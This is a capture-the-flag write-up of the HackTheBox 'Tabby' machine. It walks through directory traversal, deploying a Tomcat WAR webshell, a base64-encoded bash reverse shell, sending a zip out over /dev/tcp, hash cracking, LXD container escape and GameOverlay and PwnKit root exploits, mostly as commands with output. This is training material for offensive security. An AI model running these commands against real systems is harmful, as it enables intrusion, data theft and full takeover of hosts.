---
render_with_liquid: false
title: HackTheBox Writeup  Tabby
date: 2023-12-02 13:56:28 +1400
tags: [hackthebox, nmap, linux, feroxbuster, katana, directory-traversal, tomcat, tomcat2rce, tomcat-manager, tomcat-manager-bypass, msfvenom, webshell, jsp, discover-secrets, zip2john, hashcat, password-reuse, lxd, oscp-like, kernel-exploit, pwnkit, hydra, gf, nuclei]
---



Tabby is a easy difficulty Linux machine. Enumeration of the website reveals a second website that is hosted on the same server under a different vhost. This website is vulnerable to Local File Inclusion. Knowledge of the OS version is used to identify the `tomcat-users.xml` file location. This file yields credentials for a Tomcat user that is authorized to use the `/manager/text` interface. This is leveraged to deploy of a war file and upload a webshell, which in turn is used to get a reverse shell. Enumeration of the filesystem reveals a password protected zip file, which can be downloaded and cracked locally. The cracked password can be used to login to the remote machine as a low privileged user. However this user is a member of the LXD group, which allows privilege escalation by creating a privileged container, into which the host's filesystem is mounted. Eventually, access to the remote machine is gained as `root` using SSH.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ pt init '10.129.135.95 tabby.htb megahosting.htb'
+---------+--------+---------------+-----------------+
| PROFILE | STATUS |      IP       |     DOMAIN      |
+---------+--------+---------------+-----------------+
| tabby   | on     | 10.129.135.95 | tabby.htb       |
| tabby   | on     | 10.129.135.95 | megahosting.htb |
+---------+--------+---------------+-----------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Sat Dec  2 13:56:27 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,8080 tabby.htb
Nmap scan report for tabby.htb (10.129.38.32)
Host is up, received user-set (0.42s latency).
Scanned at 2023-12-02 13:56:28 CST for 27s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDv5dlPNfENa5t2oe/3IuN3fRk9WZkyP83WGvRByWfBtj3aJH1wjpPJMUTuELccEyNDXaUnsbrhgH76eGVQAyF56DnY3QxWlt82MgHTJWDwdt4hKMDLNKlt+i+sElqhYwXPYYWfuApFKiAUr+KGvnk9xJrhZ9/bAp+rW84LyeJOSZ8iqPVAdcjve5As1O+qcSAUfIHlZGRzkVuUuOq2wxUvegKsYnmKWUZW1E/fRq3tJbqJ5Z0JwDklN21HR4dmM7/VTHQ/AaTl/JnQxOLFUlryXAFbjgLa1SDOTBDOG72j2/II2hdeMOKN8YZN9DHgt6qKiyn0wJvSE2nddC2BbnGzamJlnQaXOpSb3+WDHP+JMxQJQrRxFoG4R6X2c0rx+yM5XnYHur9cQXC9fp+lkxQ8TtkMijbPlS2umFYcd9WrMdtEbSeKbaozi9YwbR9MQh8zU2cBc7T9p3395HAWt/wCcK9a61XrQY/XDr5OSF2MI5ESVG9e0t8jG9Q0opFo19U=
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDeYRLCeSORNbRhDh42glSCZCYQXeOAM2EKxfk5bjXecQyV5W7DYsEqMkFgd76xwdGtQtNVcfTyXeLxyk+lp9HE=
|   256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKHA/3Dphu1SUgMA6qPzqzm6lH2Cuh0exaIRQqi4ST8y
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sat Dec  2 13:56:55 2023 -- 1 IP address (1 host up) scanned in 27.59 seconds
```

## 80 - Site : Mega Hosting


### Info

![](/assets/obsidian/33d014fdae917aa0235d07f5b9d905f0.png)

### Directory

```bash
feroxbuster -t 150 -o ferox_80.txt -k -u 'http://tabby.htb' -n
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ cat ferox_80.txt | grep -v 'tabby.htb/assets/'
200      GET       17l       68w     5223c http://tabby.htb/logo.png
200      GET      373l      938w    14175c http://tabby.htb/
```

## 8080 - Tomcat 9


### Info

![](/assets/obsidian/ee6e51546a37320b4e0bf6379bb414c0.png)

### Directory

```bash
feroxbuster -t 150 -o ferox_8080.txt -k -u 'http://tabby.htb:8080' -n
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ cat ferox_8080.txt | awk '$1!=400 && $1!=404'
302      GET        0l        0w        0c http://tabby.htb:8080/docs => http://tabby.htb:8080/docs/
302      GET        0l        0w        0c http://tabby.htb:8080/host-manager/ => http://tabby.htb:8080/host-manager/html
401      GET       63l      291w     2499c http://tabby.htb:8080/manager/html
401      GET       54l      241w     2044c http://tabby.htb:8080/host-manager/html
302      GET        0l        0w        0c http://tabby.htb:8080/manager/ => http://tabby.htb:8080/manager/html
200      GET       29l      211w     1895c http://tabby.htb:8080/
302      GET        0l        0w        0c http://tabby.htb:8080/manager => http://tabby.htb:8080/manager/
302      GET        0l        0w        0c http://tabby.htb:8080/examples => http://tabby.htb:8080/examples/
302      GET        0l        0w        0c http://tabby.htb:8080/docs/images => http://tabby.htb:8080/docs/images/
302      GET        0l        0w        0c http://tabby.htb:8080/docs/api => http://tabby.htb:8080/docs/api/
302      GET        0l        0w        0c http://tabby.htb:8080/docs/config => http://tabby.htb:8080/docs/config/
302      GET        0l        0w        0c http://tabby.htb:8080/docs/images/fonts => http://tabby.htb:8080/docs/images/fonts/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp => http://tabby.htb:8080/examples/jsp/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/include => http://tabby.htb:8080/examples/jsp/include/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/error => http://tabby.htb:8080/examples/jsp/error/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/images => http://tabby.htb:8080/examples/jsp/images/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/xml => http://tabby.htb:8080/examples/jsp/xml/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/servlets => http://tabby.htb:8080/examples/servlets/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/servlets/images => http://tabby.htb:8080/examples/servlets/images/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/plugin => http://tabby.htb:8080/examples/jsp/plugin/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/forward => http://tabby.htb:8080/examples/jsp/forward/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/security => http://tabby.htb:8080/examples/jsp/security/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/sessions => http://tabby.htb:8080/examples/jsp/sessions/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/cal => http://tabby.htb:8080/examples/jsp/cal/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/colors => http://tabby.htb:8080/examples/jsp/colors/
200      GET       10l       20w      255c http://tabby.htb:8080/examples/jsp/security/j_security_check;jsessionid=5BA0F10BCECC59289E8172828FF6E8C7
200      GET       23l       45w      627c http://tabby.htb:8080/examples/jsp/security/protected
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/plugin/applet => http://tabby.htb:8080/examples/jsp/plugin/applet/
302      GET        0l        0w        0c http://tabby.htb:8080/examples/jsp/async => http://tabby.htb:8080/examples/jsp/async/
302      GET        0l        0w        0c http://tabby.htb:8080/docs => http://tabby.htb:8080/docs/
302      GET        0l        0w        0c http://tabby.htb:8080/host-manager/ => http://tabby.htb:8080/host-manager/html
401      GET       54l      241w     2044c http://tabby.htb:8080/host-manager/html
302      GET        0l        0w        0c http://tabby.htb:8080/manager/ => http://tabby.htb:8080/manager/html
401      GET       63l      291w     2499c http://tabby.htb:8080/manager/html
200      GET       29l      211w     1895c http://tabby.htb:8080/
302      GET        0l        0w        0c http://tabby.htb:8080/manager => http://tabby.htb:8080/manager/
302      GET        0l        0w        0c http://tabby.htb:8080/examples => http://tabby.htb:8080/examples/
```

# User Flag
---

## Shell as tomcat

### Directory traversal at mega hosting


#### Finding Directory traversal

There's only one dynamic function at mega hosting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ katana -jc -d 5 -kf all -f qurl -jsl -silent -o katana_params.txt -u 'http://megahosting.htb'
http://megahosting.htb/assets/js/plugins.js?autoplay=1&v=
http://megahosting.htb/news.php?file=statement
```

`news.php` is vulnerable to directory traversal

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ curl --path-as-is -s http://megahosting.htb/news.php?file=../../../../../etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

#### Get tomcat-users.xml from tomcat

Since port 8080 is `tomcat 9`, and we know logging in as a user with `manager` role can achieve RCE

![](/assets/obsidian/08acf3989016affe6f30eccadfab4c14.png)

I tried to get `/etc/tomcat9/tomcat-users.xml` as it said in the description, but that file doesn't exist

![](/assets/obsidian/94408faa023b6ea8e36ec7e99c1225e0.png)

A better way to get the correct path is to setup a `20.04 LTS` VM and install `tomcat 9` on it, then search for `tomcat-users.xml`

But I will just follow **hacktricks**

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#rce

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ curl --path-as-is -s http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

### Tomcat webapp manager to RCE


#### Foothold

After login to manager webapp, it shows **403 access denied**

![](/assets/obsidian/3dee2256610eb55dac7ee87b4b839b35.png)

We aren't in `manager-gui` group, but we can manage web apps manually through `/manager/text`

#### Create a war webshell

> **TLDR**
> Use `msfvenom` to quickly create a `.war` reverse shell
> ```bash
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > rev.war
> ```
{: .prompt-tip }

Create a JSP webshell in `war` file

> **What is `war` file?**
> A web archive (WAR) file is **a packaged web application**, it can be created by compression tools such as `tar` and `zip`
{: .prompt-info }

Clone an example `jsp` webshell

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ cp /usr/share/webshells/jsp/cmdjsp.jsp .cache.jsp
```

Edit the JSP webshell to make it work on **linux**

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ diff /usr/share/webshells/jsp/cmdjsp.jsp .cache.jsp
16c16
<          Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
---
>          Process p = Runtime.getRuntime().exec(cmd);
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ zip -r backup.war .cache.jsp
  adding: .cache.jsp (deflated 42%)
```

#### Deploy webapp (Bypass GUI interface 403 with text interface)

Upload the `war` file to deploy an APP

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ curl -T backup.war -u 'tomcat:$3cureP4s5w0rd123!' "http://tabby.htb:8080/manager/text/deploy?path=/backup"
OK - Deployed application at context path [/backup]
```

> **How to Undeploy APP**
> ```bash
> ┌──(bravosec㉿fsociety)-[~/htb/Tabby]
> └─$ curl http://'tomcat':'$3cureP4s5w0rd123!'@tabby.htb:8080/manager/text/undeploy?path=/backup
> OK - Undeployed application at context path [/backup]
> ```
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ curl 'http://tabby.htb:8080/backup/.cache.jsp' --data-urlencode 'cmd=id'
[...]
<pre>
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
</pre>

<!--    http://michaeldaw.org   2006    -->
```

#### Get reverse shell

Since the **webshell** uses `getRuntime()`, we need to format the command in curly brackets `{}`

The command format is :

```bash
bash -c {echo,$BASE64_STRING}|{base64,-d}|{bash,-i}
```

Craft the base64 string, add `spaces` to the string until `equal` doesn't appear to escape bad characters

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ echo 'bash -i >&/dev/tcp/10.10.16.30/1111 0>&1 ' | base64 -w0
YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjMwLzExMTEgMD4mMSAK 
```

Send the payload

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ curl 'http://tabby.htb:8080/backup/.cache.jsp' --data-urlencode 'cmd=bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjMwLzExMTEgMD4mMSAK}|{base64,-d}|{bash,-i}'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.135.95] 43244
bash: cannot set terminal process group (1020): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@tabby:/var/lib/tomcat9$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<t9$ python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm
tomcat@tabby:/var/lib/tomcat9$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```


## From tomcat to ash


### Discovered a backup zip file in /var/www/html

There's another user `ash`, the info was gathered via directory traversal already

```bash
tomcat@tabby:/var/lib/tomcat9$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

There's a backup file in `/var/www/html`

```bash
tomcat@tabby:/var/lib/tomcat9$ cd /var/www/html/
tomcat@tabby:/var/www/html$ find . -type f -ls
    13165      4 -rw-r--r--   1 root     root          123 Jun 16  2020 ./news.php
    13121     16 -rw-r--r--   1 root     root        14175 Jun 17  2020 ./index.php
[...]
    13122      4 -rw-r--r--   1 root     root         1574 Mar 10  2016 ./Readme.txt
    13120      4 -rw-r--r--   1 root     root          766 Jan 13  2016 ./favicon.ico
    13474     12 -rw-r--r--   1 ash      ash          8716 Jun 16  2020 ./files/16162020_backup.zip
    12727      8 -rw-r--r--   1 root     root         6507 Jun 16  2020 ./files/statement
    13056      4 -rw-r--r--   1 root     root         2894 May 21  2020 ./logo.png
    
tomcat@tabby:/var/www/html$ unzip -l ./files/16162020_backup.zip
Archive:  ./files/16162020_backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2016-03-31 00:28   var/www/html/assets/
      766  2016-01-13 15:45   var/www/html/favicon.ico
        0  2020-06-16 13:42   var/www/html/files/
    14793  2020-06-16 11:09   var/www/html/index.php
     2894  2020-05-21 11:42   var/www/html/logo.png
      123  2020-06-16 11:19   var/www/html/news.php
     1574  2016-03-10 13:20   var/www/html/Readme.txt
---------                     -------
    20150                     7 files
```

Exfiltrate the backup file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ nc -lvnp 443 > loot/16162020_backup.zip
```

```bash
tomcat@tabby:/var/www/html$ cat ./files/16162020_backup.zip > /dev/tcp/10.10.16.30/443
```

The file was password protected

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby/loot]
└─$ 7z x -o'www' 16162020_backup.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 5 5600X 6-Core Processor              (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 8716 bytes (9 KiB)

Extracting archive: 16162020_backup.zip
--
Path = 16162020_backup.zip
Type = zip
Physical Size = 8716


Enter password (will not be echoed):
```

### Crack password of the backup zip file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby/loot]
└─$ zip2john 16162020_backup.zip > 16162020_backup.zip.hash
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(bravosec㉿fsociety)-[~/htb/Tabby/loot]
└─$ zip2john 16162020_backup.zip -o var/www/html/Readme.txt > 16162020_backup.zip.hash
Using file var/www/html/Readme.txt as only file to check
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
```

```bash
hashcat 16162020_backup.zip.hash /opt/wordlists/rockyou.txt --user -m 17200
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby/loot]
└─$ hashcat 16162020_backup.zip.hash /opt/wordlists/rockyou.txt --user -m 17200 --show
16162020_backup.zip/var/www/html/Readme.txt:$pkzip$1*1*2*0*325*626*32db9ce3*1bf0*51*8*325*6a8b*32010e3d24c744ea56561bbf91c0d4e22f9a300fcf01562f6fcf5c986924e5a6f613833477c8584d160a0c9bfa3c0aa3f850479d6fbfd299de575a1259a3380347ca40c3f2b30877191552882046dfe2aa2fed2789b022408e1fdf64d62b819f15c81a2673fd9cb8f6bca4ad45257dcc940067b6fa06e24068a171035ddb76bb6524bbfcaa6aec7c11663040204824d7ece42779d89418dce61b65dfc1063ca94d7f5ffd0d268cddd4ec2693c4280bed2d1f3ad8197782a8bced10dd1f73271696844c894680fd5a6a78384a966d446bd91a243377e76618e7ed5a3c2608f83ebcd7ceeec02c18b71a857898f897f4fdb60417bc2ae85e74215c2f666266d9fb41591e42638226962962632518ba30298fcd4f695a5650694685fb091756a46a4e8369b80fa7d74611b302fc5a8877e52485daa32dc589e3644ef92d331e2ef1e0b06e246da72af7216280b99305c8688b6c5477484a3913e08a40f50104ca955607dc737d9945e18515066ba64759a3300c6373b4ddd9d19acf0950a9a2d4dbb6bcea0f5ba536d3137cd3951b185e2f97a852517aee71af08d571cb0762d115e9e882d25babd44a02a0c55fe303d48d5e3f0c73f946de7fcbd2b92a7091d0d4f4a48c66ab4f50f079d4bec65e64b1bf8dd66eadfda9998da25ca6681ce977ccd461d89b56fa6faa38122b2d7f3888c464e69ce8e405e9d6169c79a5db0a3d8e9abcd490b6024f6f9e5a318be770fc9096947496e1297a56569019b5a99c992b4bfaa91d79ab42f8c96daa240be70f1dc1050d813537d4e3fda5e30a0a3db7137c67844cd7469dd1481f6c101b4834b4435f38961182a10b77bf13f22c2cb7848fca5a9ab8cf7273d7500bc7cca8e140a6e7e4ddc851cdf6ada94131686d5a14b359e8fa51f84ab9011271e02aadcb3e7a24aa76c77c3a7768c84ecb8f077fa81b0476f7d3b3745b91f11cec122a7b81061f261dbdf8965b4371b387e526df8d56efa278305612550c203ecc263ae26dc54a80f0d87085f64fb37b2998a2e94fefcd07893e47b0e6054d1efe03cf1c61c2a7fd943a4745b341294e1803fe9d2ffc119076552e4717657e0c5f8a4e773bffb7ea23f51d9588925d866cd11dc5ad0e7155c4e3*$/pkzip$:admin@it
```

### Password reuse

The zip file might be encrypted by the only normal user `ash`, so password reuse worth a try

```bash
tomcat@tabby:/var/www/html$ su - ash
Password:admin@it
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:~$ cat user.txt
c1fdccc0fb858c0cdbc93c99347feef5
```

# Root Flag
---

## From ash to root


### lxd/lxc Group - Privilege escalation

`id` command gave an interesting output, the user have `lxd` group

> **What are LXD/LXC?**
> - **LXC (Linux Container)** : Virtualization software at the operating system level
>- **LXD (Linux Container Daemon)** : A type of hypervisor specifically for containers
>
> Users with `LXD` group can perform actions as root
{: .prompt-tip }

> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation#method-1

Just follow the instructions of **Method 1** on **hacktricks**

```bash
sudo su

#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools

#Clone repo
git clone https://github.com/lxc/distrobuilder

#Make distrobuilder
cd distrobuilder
make

#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
```

Upload the 2 files to target

```bash
┌──(bravosec㉿fsociety)-[~/ContainerImages/alpine]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

Must initialize LXC before exploiting, choose default values for the options

```bash
ash@tabby:/tmp$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]:
Do you want to configure a new storage pool? (yes/no) [default=yes]:
Name of the new storage pool [default=default]:
Name of the storage backend to use (btrfs, dir, lvm, zfs, ceph) [default=zfs]:
Create a new ZFS pool? (yes/no) [default=yes]:
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]:
Size in GB of the new loop device (1GB minimum) [default=5GB]:
Would you like to connect to a MAAS server? (yes/no) [default=no]:
Would you like to create a new local network bridge? (yes/no) [default=yes]:
What should the new bridge be called? [default=lxdbr0]:
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]:
Would you like the LXD server to be available over the network? (yes/no) [default=no]:
Would you like stale cached images to be updated automatically? (yes/no) [default=yes]
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
```

Add the image

> It is **important** to import the image from user's `$HOME` directory, otherwise it might fail
{: .prompt-info }

```bash
cd ~
wget 10.10.16.30/rootfs.squashfs 10.10.16.30/incus.tar.xz
lxc image import incus.tar.xz rootfs.squashfs --alias alpine
```

The image was successfuly imported

```bash
ash@tabby:~$ lxc image list
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
| alpine | 87161be7716b | no     | Alpinelinux 3.18 x86_64 (20231209_0947) | x86_64       | CONTAINER | 2.94MB | Dec 9, 2023 at 11:00am (UTC) |
+--------+--------------+--------+-----------------------------------------+--------------+-----------+--------+------------------------------+
```

Create a container in privileged mode and share the root path

```bash
ash@tabby:~$ lxc init alpine privesc -c security.privileged=true
Creating privesc
ash@tabby:~$ lxc list
+---------+---------+------+------+-----------+-----------+
|  NAME   |  STATE  | IPV4 | IPV6 |   TYPE    | SNAPSHOTS |
+---------+---------+------+------+-----------+-----------+
| privesc | STOPPED |      |      | CONTAINER | 0         |
+---------+---------+------+------+-----------+-----------+
ash@tabby:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc
```

> If you find this error _**Error: No storage pool found. Please create a new storage pool**_ 
> 
> Run `lxd init` and **repeat** the previous chunk of commands
{: .prompt-danger }

Execute the container

```bash
ash@tabby:~$ lxc start privesc
ash@tabby:~$ lxc exec privesc /bin/sh
~ # id
uid=0(root) gid=0(root)
```

Give SUID to bash binary on host machine

```bash
~ # chmod u+s /mnt/root/bin/bash
~ # exit
```

Now we have root on host

```bash
ash@tabby:~$ bash -p
bash-5.0# id
uid=1000(ash) gid=1000(ash) euid=0(root) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
bash-5.0# cat /root/root.txt
6ac8866ec4dd33e11f1e66e0fb8f8170
```

# Additional
---

## Privilege escalation with CVEs


### Info

This was an old machine

```bash
tomcat@tabby:~$ uname -a
Linux tabby 5.4.0-31-generic #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
tomcat@tabby:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04 LTS (Focal Fossa)"
[...]
```

Use popular privesc methods such as **Pwnkit** and **GameOverlay**

### Gameoverlay

```bash
tomcat@tabby:~$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'

# id
uid=0(root) gid=997(tomcat) groups=997(tomcat)
```

### Pwnkit

> https://github.com/joeammond/CVE-2021-4034

```bash
tomcat@tabby:~$ wget 10.10.16.30/PwnKit.py -O /dev/shm/p && python3 /dev/shm/p
[+] Creating shared library for exploit code.
[+] Calling execve()

# id
uid=0(root) gid=997(tomcat) groups=997(tomcat)
```

## Automate vulnerability discovery


### Info

URLs endpoints are usually a very large amount in real cases, automation is a must

### Passively

- Web scrapping can be done with **[ParamSpider](https://github.com/devanshbatham/ParamSpider)** (OSINT) or [katana](https://github.com/projectdiscovery/katana) (Actively)
- Use [gf](https://github.com/tomnomnom/gf) and [Gf-Patterns](https://github.com/1ndianl33t/Gf-Patterns) to find potential vulnerabilities from parameters in URLs based on regexes

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ gf lfi katana_params.txt
http://megahosting.htb/news.php?file=statement
```

### Actively

- [katana](https://github.com/projectdiscovery/katana)
- [nuclei](https://github.com/projectdiscovery/nuclei)
- **[fuzzing-templates](https://github.com/projectdiscovery/fuzzing-templates)**

```bash
katana -jc -d 5 -kf all -f qurl -jsl -silent -o katana_params.txt -u 'http://megahosting.htb'
nuclei -me nuclei_fuzzing -l katana_params.txt -t ~/fuzzing-templates -rl 05
```

![](/assets/obsidian/a7d19c553dcf3fa2216c388621b8083e.png)

## Dump files via LFI / Directory Traversal

Wrote a script to parse dumped files from **ffuf**

> https://github.com/opabravo/dfuf

## Failed Attempts

### Brute force tomcat default creds

Tried default credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/Tabby]
└─$ creds search tomcat export
+----------------------------------+------------+------------+
| Product                          |  username  |  password  |
+----------------------------------+------------+------------+
| apache tomcat host manager (web) |   admin    |   admin    |
